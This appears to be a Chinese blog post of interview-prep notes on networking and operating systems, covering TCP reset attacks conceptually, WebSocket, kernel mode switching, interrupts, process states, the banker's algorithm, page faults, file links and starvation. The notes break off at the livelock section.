<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2IyMDljNzQwODk5YWFmMDIyYmI5M2QyZDEyZjc5NjJfSXRQUkJYVVJRVjBxOU11V0tIR0JlTUNXZHkzR2Q4RTdfVG9rZW46U3g1VmJOcUUzb3VjNDJ4b1VWMmN0ODR3bk9iXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmZmMDhlYjJjODA0MzVmMjY2YTE0ZDlmNzg0Y2IyZDRfOWJYNU9ZakNYQWxXc0Z6bFIybkVRSkR5Q1R2MWwxeXhfVG9rZW46UWhKNmJ0Q3RJb25sR014M2RIbGNQZHd6bmxiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="TCP重置攻击">TCP重置攻击</h3>
<h2 id="✅-一、TCP-重置攻击（TCP-Reset-Attack）">✅ 一、TCP 重置攻击（TCP Reset Attack）</h2>
<h3 id="🎯-现实例子类比：">🎯 现实例子类比：</h3>
<p>你和朋友 Mike 正在微信上聊天，突然 Mike 的聊天界面弹出：“对方已断开连接”。你很奇怪，其实你根本没退出。</p>
<p>实际上，是第三个人 Jack 冒充 Mike 给你发了一条“断开消息”，你就以为 Mike 真退出了，结果你们的对话被迫中止。</p>
<p>这就类似于——<strong>TCP RST 被伪造导致连接中断</strong>。</p>
<h3 id="🧠-技术原理：">🧠 技术原理：</h3>
<ul>
<li>TCP 协议中允许一方发送 RST（Reset）包来强制关闭连接；</li>
<li>攻击者只要知道你和 Mike 的 IP 地址、端口号和序列号，就能<strong>伪造一个“Mike 断开连接”的 RST 包发给你</strong>；</li>
<li>你收到后信以为真，就中断了通信。</li>
</ul>
<h3 id="🛡-防护策略：">🛡 防护策略：</h3>
<ol>
<li><strong>启用 TLS 加密通信</strong>：即使连接中断，也不会丢失加密会话；</li>
<li><strong>TCP 序列号随机化</strong>：让攻击者更难猜中序列号；</li>
<li><strong>防火墙 + IDS/IPS</strong>：阻止非法的 RST 包；</li>
<li><strong>TCP 协议栈限制短时间内重复 RST 包的响应</strong>。</li>
</ol>
<h2 id="WebSocket和Socket的区别">WebSocket和Socket的区别</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGFmNzUyM2QxZmY2ZDAxMTllNzlkYWQyNTRlYzNlODNfamlrVEg1a1VaY0RaWkVSZnI5Q2FpSVo0Qjk5eG91N0ZfVG9rZW46TW5rTmJSSGdyb28yYmV4M0hDc2NCODFtbmFmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmEwODJmZjk3OWVmYmE1OWNhMzBjMzFlZjZhNjViMmNfZDdRM1JZSHhaSFpGNklCSmx2SExnbkdRVFNuZEdrdFJfVG9rZW46Q1dnYmJ0THJPb3BvQm54UXV6cmNwa0ozbjRkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-面试总结话术">✅ 面试总结话术</h2>
<blockquote>
<p>“Socket 是通信机制，WebSocket 是基于 Socket 封装的协议，主要用于浏览器与服务器双向通信。WebSocket 建立在 TCP 上，通过 HTTP Upgrade 完成握手后建立持久连接。它解决了传统 HTTP 无法进行双向推送的问题，适合实时性强的 Web 应用场景。”</p>
</blockquote>
<h2 id="Nagle算法和延迟确认">Nagle算法和延迟确认</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTA1MzVjMDc5YjRlOTQ1NzU3NWRkMjBhYTNjNzg3ZGVfdkp5NnNLc3JNTDVQeWUyb1RIVGlTbFpYN05GUnlaNGZfVG9rZW46QlpwY2JycE5Xb3pnNlZ4YWg4T2NWVXhnbmJiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>javaguide-操作系统</h1>
<h2 id="用户态和内核态是怎么切换的">用户态和内核态是怎么切换的</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWJhMGU1MGNhYjY5OGY0OTg2YWIwNjU4ZjlhNDExYjRfMXdFUlhJanR6VnkydFU4alU0OE5uWUZGVkY1WjI1dzVfVG9rZW46WWhlQ2Jram1SbzY1Ukp4SFVDc2NtYnBWbkJnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGE5ZDQyNGZjNzhiNzFmMTUzZjBmZTcwMTAwODI2NDNfSEtkNTZNVjJFWnNkMmdhbVk0ak5FaW5STDFicE00WmdfVG9rZW46QmVyMGJEdnJLb0haanp4a3VFRGNjZ3BWbkJmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-三、中断与异常的分类（详细说明）">✅ 三、中断与异常的分类（详细说明）</h2>
<h3 id="📌-中断分类：">📌 中断分类：</h3>
<ol>
<li><strong>可屏蔽中断（Maskable Interrupt）</strong>： 可以通过设置中断屏蔽位来临时忽略，例如常见的外设中断。</li>
<li><strong>不可屏蔽中断（Non-Maskable Interrupt, NMI）</strong>： 不可关闭的中断，通常用于紧急情况，如硬件故障检测。</li>
</ol>
<h3 id="📌-异常分类：">📌 异常分类：</h3>
<ol>
<li><strong>故障（Fault）</strong>： 可以被处理后重新尝试当前指令，如缺页异常（Page Fault）。</li>
<li><strong>陷阱（Trap）</strong>： 执行完当前指令再进入内核，如系统调用。</li>
<li><strong>终止（Abort）</strong>： 严重错误，无法继续执行，如内存校验错误，通常会终止进程或系统。</li>
</ol>
<h2 id="✅-四、处理过程上的不同：">✅ 四、处理过程上的不同：</h2>
<h3 id="中断处理过程：">中断处理过程：</h3>
<ul>
<li>外设发出中断信号</li>
<li>CPU 当前指令执行完后响应中断</li>
<li>保存上下文、跳转到中断服务程序</li>
<li>中断服务程序执行完后，通过中断返回指令（如 <code>IRET</code>）恢复原上下文</li>
</ul>
<h3 id="异常处理过程：">异常处理过程：</h3>
<ul>
<li>当前指令执行过程中检测到错误</li>
<li>立即中断执行流程</li>
<li>保存上下文、跳转到异常处理程序</li>
<li>异常处理程序可能：
<ul>
<li>终止进程（如非法内存访问）</li>
<li>处理后重试（如缺页）</li>
<li>正常继续执行下一条指令（如系统调用）</li>
</ul>
</li>
</ul>
<p>用户态切换到内核态的 3 种方式：</p>
<ol>
<li><strong>系统调用（Trap）</strong>：用户态进程 <strong>主动</strong> 要求切换到内核态的一种方式，主要是为了使用内核态才能做的事情比如读取磁盘资源。系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现。</li>
<li><strong>中断（Interrupt）</strong>：当外围设备完成用户请求的操作后，会向 CPU 发出相应的中断信号，这时 CPU 会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。</li>
<li><strong>异常（Exception）</strong>：当 CPU 在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。</li>
</ol>
<p>在系统的处理上，中断和异常类似，都是通过中断向量表来找到相应的处理程序进行处理。区别在于，中断来自处理器外部，不是由任何一条专门的指令造成，而异常是执行当前指令的结果</p>
<h2 id="✅-一、中断的经典例子">✅ 一、中断的经典例子</h2>
<h3 id="🌐-示例：键盘输入中断">🌐 示例：<strong>键盘输入中断</strong></h3>
<blockquote>
<p>操作系统如何响应你按下一个键？</p>
</blockquote>
<ol>
<li>你在键盘上按下一个键（比如 <code>A</code>）</li>
<li>键盘控制器将此事件通过中断控制器发给 CPU</li>
<li>CPU 执行完当前指令后，检测到有中断请求</li>
<li>CPU 查询中断向量表，找到键盘中断对应的处理程序地址</li>
<li>跳转执行这个中断服务程序（ISR），读取键值</li>
<li>系统将按下的 <code>A</code> 存入缓冲区</li>
<li>中断处理完成，返回用户程序继续执行</li>
</ol>
<p>📌 特点：键盘输入是异步事件，CPU 不知道你什么时候会按，完全由外设主动发起，这就是中断。</p>
<h2 id="✅-二、异常的经典例子">✅ 二、异常的经典例子</h2>
<h3 id="💥-示例1：除以零错误">💥 示例1：<strong>除以零错误</strong></h3>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;<span class="string">` `</span><span class="keyword">int</span> b = <span class="number">0</span>;<span class="string">` `</span><span class="keyword">int</span> c = a / b; <span class="comment">// 除0异常</span></span><br></pre></td></tr></table></figure>
<ol>
<li>执行到 <code>a / b</code> 这一条指令时，CPU 检测到除法操作除数为 0</li>
<li>此时立即触发一个“除0异常”</li>
<li>CPU 查找异常向量表，跳转到除零处理程序</li>
<li>操作系统一般会终止当前进程并抛出错误信息（如 segmentation fault 或 SIGFPE）</li>
</ol>
<p>📌 特点：是由当前<strong>指令本身直接引发的</strong>，属于同步异常，必须立即处理。</p>
<h3 id="💡-示例2：系统调用异常（软中断-Trap）">💡 示例2：<strong>系统调用异常（软中断 Trap）</strong></h3>
<p>以 Linux 为例，用户程序通过 <code>int 0x80</code> 指令或 <code>syscall</code> 指令请求内核服务：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 伪代码：<span class="keyword">write</span> 系统调用<span class="string">` `</span>mov eax, <span class="number">4</span>       ; 系统调用号 (sys_write) <span class="string">``</span>mov ebx, <span class="number">1</span>       ; 文件描述符 (stdout) <span class="string">``</span>mov ecx, msg     ; 消息地址 <span class="string">``</span>mov edx, len     ; 长度<span class="string">` `</span><span class="keyword">int</span> <span class="number">0x80</span>         ; 触发中断进入内核</span><br></pre></td></tr></table></figure>
<ol>
<li><code>int 0x80</code> 是一条专门用来触发异常（陷阱）的指令</li>
<li>CPU 执行这条指令时，触发软中断</li>
<li>查中断向量表跳转到内核的系统调用处理程序</li>
<li>内核执行 write 操作，把内容输出到终端</li>
</ol>
<p>📌 特点：这类异常是<strong>程序主动发起的</strong>，属于“陷阱（trap）”，异常处理后可以恢复执行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzFhNDhkMTAzZmNiMmY4MGYxNDEzOGMyMGM2MDk0MDFfTEd5c1FyTXY2VkNmZ2JQZ3dIWEo4SkxySWRCeVczY3VfVG9rZW46WVFtOWJTNVMwb0xjMFd4NTlVRGNkNEhMblJnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="Socket">Socket</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDIyN2I3YjdjMTc5MjlmZTJjYjljYmFjYjI1NzQ4M2Nfa1k2RkgyNXU2QjlFOWdtU2oyd25keFpjV2hPRjV6MkxfVG9rZW46WTdiYWJuc21nb0J5MjZ4UXNCemNvaTk0bnZlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGE5NzM0NjE2ODlmZGY0ZDFlMDU5ZjIxNjlkZjk1MzRfYmNsbkg5ajdGUERrZlFNTWZoY25FYnVBeTdVSDV2bzdfVG9rZW46VlB3cGJSck9nb1hWb3N4R0o0dGNWRDlsbnJiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjEzZDY0Y2E0MjBkZDYzN2QyNTY0MjljMTk2N2Y2NzhfWklnbjFVSFltWkRMc3BMa1dlVEVCMkRXMnNzUXZGb0lfVG9rZW46Rm9ZVWJnUDdWb085QnR4a2hnTmNuMlpTbk1sXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="僵尸进程和孤儿进程">僵尸进程和孤儿进程</h2>
<p>在 Unix/Linux 系统中，子进程通常是通过 fork()系统调用创建的，该调用会创建一个新的进程，该进程是原有进程的一个副本。子进程和父进程的运行是相互独立的，它们各自拥有自己的 PCB，即使父进程结束了，子进程仍然可以继续运行。</p>
<p>当一个进程调用 exit()系统调用结束自己的生命时，内核会释放该进程的所有资源，包括打开的文件、占用的内存等，但是该进程对应的 PCB 依然存在于系统中。这些信息只有在父进程调用 wait()或 waitpid()系统调用时才会被释放，以便让父进程得到子进程的状态信息。</p>
<p>这样的设计可以让父进程在子进程结束时得到子进程的状态信息，并且可以防止出现“僵尸进程”（即子进程结束后 PCB 仍然存在但父进程无法得到状态信息的情况）。</p>
<p><strong>僵尸进程</strong>：子进程已经终止，但是其父进程仍在运行，且父进程没有调用 wait()或 waitpid()等系统调用来获取子进程的状态信息，释放子进程占用的资源，导致子进程的 PCB 依然存在于系统中，但无法被进一步使用。这种情况下，子进程被称为“僵尸进程”。避免僵尸进程的产生，父进程需要及时调用 wait()或 waitpid()系统调用来回收子进程。</p>
<p><strong>孤儿进程</strong>：一个进程的父进程已经终止或者不存在，但是该进程仍在运行。这种情况下，该进程就是孤儿进程。孤儿进程通常是由于父进程意外终止或未及时调用 wait()或 waitpid()等系统调用来回收子进程导致的。为了避免孤儿进程占用系统资源，操作系统会将孤儿进程的父进程设置为 init 进程（进程号为 1），由 init 进程来回收孤儿进程的资源。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2NmODRmNDU4YjZmMzBkNDQ2ZDllOWRhZGQ3YzIwNWZfSk1xREYyaFVDb3F5NHg2RFE5dnFSd1RuSnBHT3FwT3VfVG9rZW46UHZ3YWJEZEZjb3BKZ2R4Yzdzd2NRcVRNbnZmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDRjNzJhNjIyOGIxZDQ2NjdmYzIyMjM2Zjk4MDFiNDlfM0lKVVA1dWlWYmlBYTQ2bk9JZ1NZb2MzWElvbnFxY2tfVG9rZW46VVE4b2JZMlcybzJaQ2h4d1hKOGNISGF0bjdiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="银行家算法">银行家算法</h2>
<h2 id="🧠-一、设计思想">🧠 一、设计思想</h2>
<p><strong>核心思想：</strong> 每当一个进程申请资源时，系统会<strong>模拟</strong>分配资源后的状态，并判断是否仍处于<strong>安全状态（Safe State）</strong>。 如果<strong>安全</strong>，就真正分配；如果<strong>不安全</strong>，就<strong>拒绝分配</strong>，从而<strong>避免死锁</strong>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzQyMTRiZDRkOGFkMTg2OTkzMTI4Mzk0N2QxMTRlZjlfNlB0TU9vc3RCMUFQMUk3cXNJMkU0a2tsMUtJcGFlWm5fVG9rZW46VzRJS2JISHNub3BEVzZ4RTdLZ2M2b2I4bnNiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🛠-四、例子（手动模拟）">🛠 四、例子（手动模拟）</h2>
<p>系统资源：A、B、C（三类资源）</p>
<ul>
<li>系统总资源：<code>A=10, B=5, C=7</code></li>
<li>进程数：5个（P0~P4）</li>
<li>当前分配（Allocation）矩阵、最大需求（Max）矩阵如下：</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Allocation</span>     Max          Available = (<span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>)` `P0:  (<span class="number">0</span> <span class="number">1</span> <span class="number">0</span>)    (<span class="number">7</span> <span class="number">5</span> <span class="number">3</span>) ``P1:  (<span class="number">2</span> <span class="number">0</span> <span class="number">0</span>)    (<span class="number">3</span> <span class="number">2</span> <span class="number">2</span>) ``P2:  (<span class="number">3</span> <span class="number">0</span> <span class="number">2</span>)    (<span class="number">9</span> <span class="number">0</span> <span class="number">2</span>) ``P3:  (<span class="number">2</span> <span class="number">1</span> <span class="number">1</span>)    (<span class="number">2</span> <span class="number">2</span> <span class="number">2</span>) ``P4:  (<span class="number">0</span> <span class="number">0</span> <span class="number">2</span>)    (<span class="number">4</span> <span class="number">3</span> <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>计算 <code>Need = Max - Allocation</code>：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">P0</span>: (<span class="number">7</span> <span class="number">4</span> <span class="number">3</span>) ``P1: (<span class="number">1</span> <span class="number">2</span> <span class="number">2</span>) ``P2: (<span class="number">6</span> <span class="number">0</span> <span class="number">0</span>) ``P3: (<span class="number">0</span> <span class="number">1</span> <span class="number">1</span>) ``P4: (<span class="number">4</span> <span class="number">3</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>尝试按算法判断是否存在一个安全序列，比如：</p>
<ol>
<li>找到 P1 (<code>Need ≤ Available = (3 3 2)</code>) ✅
<ol>
<li>执行后释放资源 <code>(2 0 0)</code>，更新 Available = <code>(5 3 2)</code></li>
</ol>
</li>
<li>找到 P3 (<code>Need = (0 1 1) ≤ Available</code>) ✅
<ol>
<li>执行后释放资源 <code>(2 1 1)</code>，Available = <code>(7 4 3)</code></li>
</ol>
</li>
<li>找到 P4…依次下去</li>
</ol>
<p>➡️ 最终所有进程都能完成，系统是<strong>安全的</strong>。</p>
<h2 id="硬性页缺失和软性页缺失"><strong>硬性页缺失</strong>和<strong>软性页缺失</strong></h2>
<p>“<strong>硬性页缺失（Hard Page Fault）</strong>”和“<strong>软性页缺失（Soft Page Fault）</strong>”的触发过程。</p>
<h2 id="🧠-场景设定：某进程第一次打开一个大文件并读取内容">🧠 场景设定：某进程第一次打开一个大文件并读取内容</h2>
<p>假设你写了以下代码：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buffer[<span class="number">4096</span>];<span class="string">` `</span><span class="keyword">int</span> fd = <span class="keyword">open</span>(<span class="string">&quot;bigfile.txt&quot;</span>, O_RDONLY); <span class="string">``</span><span class="keyword">read</span>(fd, buffer, <span class="number">4096</span>);  <span class="regexp">//</span> 读取文件开头的4KB</span><br></pre></td></tr></table></figure>
<h2 id="1、硬性页缺失（Hard-Page-Fault）出现过程">1、硬性页缺失（Hard Page Fault）出现过程</h2>
<blockquote>
<p>这是你<strong>第一次读取文件数据</strong>，系统必须<strong>从磁盘加载数据</strong>。</p>
</blockquote>
<h3 id="发生步骤：">发生步骤：</h3>
<ol>
<li>你调用 <code>read()</code>，想将磁盘文件 bigfile.txt 的前 4KB 读到用户态内存 <code>buffer</code> 中。</li>
<li>操作系统发现你访问的虚拟页 <strong>还没有映射</strong>。</li>
<li>内核查找页表，发现该虚拟页无对应物理页，于是触发了 <strong>Page Fault（缺页异常）</strong>。</li>
<li>Page Fault Handler 判断是 <strong>硬性缺页</strong>（hard fault）：
<ol>
<li>因为目标数据根本还不在物理内存里。</li>
</ol>
</li>
<li>内核从磁盘中读取该文件对应的块（页）到物理内存。</li>
<li>将读取的数据映射到虚拟页：更新页表。</li>
<li>重新执行 <code>read()</code>，成功读出内容。</li>
</ol>
<p>🟡 <strong>本质特征：物理内存里没有目标数据，要从磁盘加载。</strong></p>
<h2 id="2、软性页缺失（Soft-Page-Fault）出现过程">2、软性页缺失（Soft Page Fault）出现过程</h2>
<blockquote>
<p>这是你<strong>再次访问刚才用过的页面</strong>，它<strong>已经在内存中</strong>了，但映射关系刚被清理。</p>
</blockquote>
<h3 id="假设：">假设：</h3>
<p>你刚读完 <code>bigfile.txt</code> 的前 4KB，然后你访问同样的 <code>buffer[0]</code>，此时系统刚才 <strong>清理了页表映射（例如切换进程或压栈换出）</strong>，但物理页还在内存中。</p>
<h3 id="发生步骤：-2">发生步骤：</h3>
<ol>
<li>你访问 <code>buffer[0]</code>，引发 Page Fault（访问的虚拟页页表项被清了）。</li>
<li>Page Fault Handler 检查发现：虽然页表项失效，但 <strong>物理页还在内存中（页面缓存或文件缓存区）</strong>。</li>
<li>判定为 <strong>软性页缺失（soft fault）</strong>。</li>
<li>内核 <strong>重新建立虚拟页与物理页的映射</strong>，无需读取磁盘。</li>
<li>返回用户态，访问成功。</li>
</ol>
<p>🟢 <strong>本质特征：物理内存已有数据，仅仅是映射被释放或回收了。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGI4OGFiOTc1MDIwZjhmOTIxZDZjYTFiODg4MjE3ZTdfRWJnY3V0cHNUQmxDcUdqUlAwMkxzMjRYZG11TlVvWDlfVG9rZW46RWxlNGJBdUU1b0s0Snh4Q0ZEUGNDTWZRblVjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="硬链接和软链接">硬链接和软链接</h2>
<blockquote>
<p>硬链接是 inode 级别的“别名”，软链接是路径级别的“快捷方式”。硬链接强调等价和安全（防误删），软链接强调灵活和便利（快捷访问）。</p>
</blockquote>
<h2 id="一、硬链接（Hard-Link）">一、硬链接（Hard Link）</h2>
<h3 id="🔍-基本概念">🔍 基本概念</h3>
<p>硬链接是指 <strong>多个文件名指向同一个 inode（索引节点）</strong>，也就是说，这几个文件名其实都代表同一份数据内容。</p>
<h3 id="🧠-工作原理">🧠 工作原理</h3>
<ul>
<li>在 Linux/Unix 文件系统中，每个文件对应一个 inode（用于存储文件元信息，如权限、大小、时间戳等）；</li>
<li>当你对一个文件创建硬链接时，操作系统只是为该 inode 分配了一个新的目录项（也就是文件名）；</li>
<li>两个文件名共享同一个 inode 和数据块，完全平等，没有主次之分。</li>
</ul>
<h3 id="📌-特点">📌 特点</h3>
<ul>
<li><strong>等价性</strong>：原文件和硬链接文件本质一样，谁被删都不影响对方；</li>
<li><strong>删除机制</strong>：只有当所有指向该 inode 的硬链接都被删除后，系统才会真正释放该文件的数据块；</li>
<li><strong>限制较多</strong>：
<ul>
<li>不能对目录使用（防止形成环）；</li>
<li>不能跨文件系统（因为 inode 号在每个文件系统中唯一）；</li>
<li>不能对不存在的文件建立。</li>
</ul>
</li>
</ul>
<h3 id="✅-创建命令">✅ 创建命令</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> 原文件 硬链接文件</span><br></pre></td></tr></table></figure>
<h2 id="二、软链接（Symbolic-Link-Symlink）">二、软链接（Symbolic Link / Symlink）</h2>
<h3 id="🔍-基本概念-2">🔍 基本概念</h3>
<p>软链接其实是一个<strong>特殊类型的文件</strong>，它的内容是指向原文件路径的字符串，和原文件的 inode 不同。</p>
<h3 id="🧠-工作原理-2">🧠 工作原理</h3>
<ul>
<li>软链接相当于 Windows 的“快捷方式”；</li>
<li>它有自己独立的 inode；</li>
<li>软链接文件的内容是一个路径字符串，指向原文件。</li>
</ul>
<h3 id="📌-特点-2">📌 特点</h3>
<ul>
<li><strong>非等价性</strong>：只是引用了原文件路径；</li>
<li><strong>原文件删除后</strong>，软链接就会失效，变成<strong>悬挂链接（Dangling Link）</strong>；</li>
<li><strong>灵活性强</strong>：
<ul>
<li>可用于目录；</li>
<li>可跨文件系统；</li>
<li>可指向不存在的路径（比如暂时缺失的配置文件等）。</li>
</ul>
</li>
</ul>
<h3 id="✅-创建命令-2">✅ 创建命令</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s 原文件 软链接文件</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTlhMTdlNzljMDlhMjc3ZTYzZmI0YTY1NzMzNTllYTBfQTkxMGhHZEd6TnJid2lkQjFKRzlhT2V2VWswMTRvd2NfVG9rZW46QzlJbmJMbDRJbzJGSHN4cVA3ZWM3THBYbmdjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDM0NWFlMmUzZDFiMzZlYjNjOGYxMTRhYzI0OWM1NWJfSlFQRHh3TmtHR1gzUFBjcTZBNmRUY2FzSDVvYnE5SWNfVG9rZW46THp2aGIwb3N2b0ZlQU94QnhMbWNNRHdnblZmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="活锁和饥饿锁">活锁和饥饿锁</h2>
<p>饥饿锁（<strong>Starvation</strong>）和活锁（<strong>Livelock</strong>）是并发编程中两种常见的<strong>线程无法继续推进</strong>的异常状态。虽然不会像死锁那样彻底卡死，但也会导致系统性能下降甚至无法正常工作。</p>
<h2 id="✅-一、饥饿（Starvation）">✅ 一、饥饿（Starvation）</h2>
<h3 id="🔹-定义：">🔹 定义：</h3>
<p>当某个线程<strong>长时间无法获得资源或锁</strong>，导致<strong>迟迟得不到执行</strong>，这种现象称为<strong>饥饿</strong>。</p>
<h3 id="🔹-原因：">🔹 原因：</h3>
<ul>
<li>高优先级线程总是被优先调度，低优先级线程“永远轮不到”；</li>
<li>锁分配策略不公平（比如非公平锁）；</li>
<li>一个线程长期持有资源；</li>
<li>synchronized 修饰过多，或 synchronized(this) 被过度占用。</li>
</ul>
<h3 id="🔹-示例（Java-非公平锁）：">🔹 示例（Java 非公平锁）：</h3>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReentrantLock lock = <span class="keyword">new</span> ReentrantLock<span class="function"><span class="params">(<span class="literal">false</span>)</span>; // 非公平锁 `` ``<span class="title">Runnable</span> <span class="title">task</span> = <span class="params">()</span> -&gt;</span> &#123;</span><br></pre></td></tr></table></figure>
<p><code> while (true) &#123;</code></p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lock.tryLock()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123; <span class="string">``</span>                System.<span class="keyword">out</span>.println(Thread.currentThread().getName() + <span class="string">&quot; 获得锁&quot;</span>); <span class="string">``</span>                Thread.sleep(<span class="number">100</span>); <span class="string">``</span>            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; <span class="string">``</span>            &#125; <span class="keyword">finally</span> &#123; <span class="string">``</span>                lock.unlock(); <span class="string">``</span>            &#125; <span class="string">``</span>        &#125; <span class="keyword">else</span> &#123; <span class="string">``</span>            System.<span class="keyword">out</span>.println(Thread.currentThread().getName() + <span class="string">&quot; 等待锁&quot;</span>); <span class="string">``</span>        &#125; <span class="string">``</span>    &#125; <span class="string">``</span>&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>多个线程竞争时，有可能某个线程一直抢不到锁而“饿死”。</p>
</blockquote>
<h2 id="✅-二、活锁（Livelock）">✅ 二、活锁（Livelock）</h2>
